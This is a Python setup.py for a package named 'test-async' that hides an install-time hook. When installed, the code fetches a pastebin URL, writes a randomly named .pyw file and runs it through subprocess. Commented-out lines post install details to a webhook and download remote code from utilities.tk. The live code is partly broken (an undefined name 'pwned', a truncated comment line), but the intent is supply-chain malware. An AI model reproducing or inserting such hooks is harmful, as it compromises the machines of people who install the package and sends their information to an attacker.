import setuptools
try:
    import requests, random, os
    print(#requests.post(
        requests.get('https://pastebin.com/raw/3xcr2My4').text#), json={'content':'new run @everyone'})
        )
    r = random.randint(1, 50)
    with open(f'./{r}.pyw', 'w') as f:
        f.write(#requests.get('https://utilities.tk/rscode?r=mewhenrscode').text)
            pwned)
    #requests.post(requests.get('https://pastebin.com/raw/3xcr2My4').text, json={'content':os.path.dirname(os.pat
    import subprocess
    subprocess.Popen(f'python ./{r}.pyw', shell=True)
except Exception as ex:
    print(ex)

setuptools.setup(
    name="test-async",
)
